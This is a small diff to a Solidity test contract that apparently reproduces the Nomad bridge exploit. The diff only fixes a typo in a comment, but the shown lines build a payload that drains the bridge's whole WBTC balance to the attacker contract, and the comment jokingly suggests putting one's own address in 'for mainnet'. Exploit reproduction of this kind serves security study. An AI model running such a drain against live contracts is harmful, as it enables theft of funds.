@@ -47,7 +47,7 @@ contract Exploit_Nomad is TestHarness, TokenBalanceTracker {
         logBalancesWithLabel("Bridge", ercBridge);
         logBalancesWithLabel("Attacker", address(this));
 
-        // Try chaning address(this) for your address in mainnet ;)
+        // Try changing address(this) for your address in mainnet ;)
         bytes memory payload = getPayload(address(this), address(WBTC), WBTC.balanceOf(ercBridge));
 
         emit log_named_bytes("Tx Payload", payload);
